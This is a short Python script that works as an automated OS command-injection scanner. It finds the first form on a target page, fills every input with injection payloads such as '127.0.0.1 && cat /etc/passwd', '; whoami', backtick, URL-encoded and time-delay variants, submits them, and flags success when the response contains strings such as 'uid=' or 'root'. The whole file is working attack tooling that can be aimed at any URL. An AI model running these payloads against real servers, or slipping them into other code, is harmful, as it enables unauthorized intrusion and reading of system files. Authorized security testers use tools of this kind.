import requests
# from flask import request
from bs4 import BeautifulSoup

payloads = [
    "127.0.0.1 && whoami",
    "127.0.0.1 && id",
    "127.0.0.1 && uname -a",
    "127.0.0.1 && ls",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1; whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1 `whoami`",  
    "127.0.0.1 && echo vulnerable",
    "127.0.0.1 && sleep 5",  # time delay (blind injection)

    "127.0.0.1 & whoami",
    "127.0.0.1 & dir",
    "127.0.0.1 & echo vulnerable",
    "127.0.0.1 & type C:\\Windows\\win.ini",
    "127.0.0.1 | whoami",
    "127.0.0.1 & timeout 5",  # time delay (Windows)

    "127.0.0.1%26%26whoami",    # && URL encoded
    "127.0.0.1%3Bwhoami",       # ; URL encoded
    "127.0.0.1%7Cwhoami",       # | URL encoded
    "127.0.0.1%60whoami%60"     # backtick encoded
]

keywords = [
    "root",              # common in Unix 'whoami' output
    "uid=",              # from `id` command
    "gid=",              # also from `id`
    "Linux",             # from `uname` or environment
    "Windows",           # Windows command output
    "C:\\",              # Windows file system
    "/bin/bash",         # system shell location
    "command not found", # partially executed input
    "No such file",      # command executed with wrong args
    "Syntax error",      # shell-level error
]

results = {}

def check_cmd_injection(url):
    page = requests.get(url, timeout=5)
    soup = BeautifulSoup(page.text, "lxml")
    form = soup.find("form")
    if not form:
        print("No form found on the page.")
        return
    action = form.get("action", "")
    method = form.get("method", "get").lower()
    base_Url = url.rstrip('/')
    inputs = form.find_all("input")
    
    submit_url = ""
    if(action.startswith("http")):
        submit_url = action
    else:
        submit_url = base_Url + "/" + action.lstrip("/")

    for load in payloads:
        data = {}
        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                data[name] = load

        if(method == "post"):
            response = requests.post(submit_url, data=data, timeout=7)
        else:
            response = requests.get(submit_url, params=data, timeout=7)
        
        if(response.status_code == 200):
            response_text = response.text
            is_present = False
            for i in keywords:
                if(i.lower() in response_text.lower()):
                    is_present = True
                    break

            if(is_present):
                results.update({load : "Yes"})
            else:
                results.update({load : "No"})
        else:
            results.update({load: f"Error: {response.status_code}"})

    return results
